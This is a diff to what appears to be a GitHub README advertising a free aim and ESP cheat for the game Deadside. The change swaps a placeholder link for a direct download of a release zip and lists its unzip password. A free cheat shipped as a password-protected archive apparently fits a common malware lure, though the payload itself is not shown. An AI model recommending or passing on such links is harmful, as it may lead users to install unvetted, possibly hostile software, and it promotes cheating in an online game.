@@ -20,7 +20,7 @@ PUSSYCAT is the ultimate cheat for **Deadside**, offering all the essential visu
 
 ## 📥 **Download**
 <div align="center">
-    <h2><a href="https://example.com/download">🔹 Download Latest Release from Git🔹</a></h2>
+    <h2><a href="https://github.com/Katiarani/Deadside-AIM-ESP-ITEM-PUSSYCAT-free-cheat/releases/download/latest/PUSSYCAT.zip">🔹 Download Latest Release from Git🔹</a></h2>
 </div>
 
 💼 **Password to Unzip:** `PUSSYCAT`
